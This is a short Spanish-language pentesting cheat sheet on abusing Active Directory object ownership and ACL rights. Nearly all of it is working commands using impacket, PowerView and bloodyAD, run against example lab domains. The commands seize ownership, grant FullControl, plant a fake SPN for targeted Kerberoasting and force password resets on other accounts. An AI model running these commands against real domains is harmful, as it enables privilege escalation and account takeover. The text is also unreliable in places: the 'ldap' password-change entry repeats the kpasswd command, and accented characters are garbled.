# Info

Si tenemos acceso a la m치quina solo mediante winrm, evil-winrm tiene muchos problemas de sesi칩n, para no perder tiempo: Usar directamente las herramientas de linux.

# Desde Linux

### Impacket

#### Cambiar el ownership
    impacket-owneredit -action write -new-owner 'aaru' -target-dn 'CN=Domain Admins,CN=Users,DC=ignite,DC=local' 'ignite.local'/'aaru':'Password@1' -dc-ip 192.168.1.6

#### Darse full control

    impacket-dacledit -action 'write' -rights 'FullControl' -principal 'sakshi' -target-dn 'CN=ankur,CN=Users,DC=ignite,DC=local' 'ignite.local'/'sakshi':'Password@1' -dc-ip 192.168.1.6
# Desde windows

### Powerview

#### Tomar control
    Set-DomainObjectOwner -Identity 'roma' -OwnerIdentity 'sameer'

#### Darse full control

    Add-DomainObjectAcl -Rights 'All' -TargetIdentity "roma" -PrincipalIdentity "sameer"

---

# Explotaci칩n/abuso
## Kerberoasting
#### 1) Creamos un spn falso sobre el usuario

    Set-DomainObject -Identity 'roma' -Set @{serviceprincipalname='mydomain/Testing'}
#### 2) Kerberosteamos y crackeamos.

## Cambiar contrase침a del user

### BloodyAD
    bloodyAD --host "192.168.1.6" -d "ignite.local" -u "sakshi" -p "Password@1" set password "ankur" "Password@987"

### Impacket
#### Cambiar mediante kpasswd
    impacket-changepasswd -reset -protocol kpasswd contoso.local/j.doe@DC1 -newpass 'N3wPassw0rd!' -altuser CONTOSO/SrvAdm
#### Cambiar mediante ldap
    impacket-changepasswd -reset -protocol kpasswd contoso.local/j.doe@DC1 -newpass 'N3wPassw0rd!' -altuser CONTOSO/SrvAdm
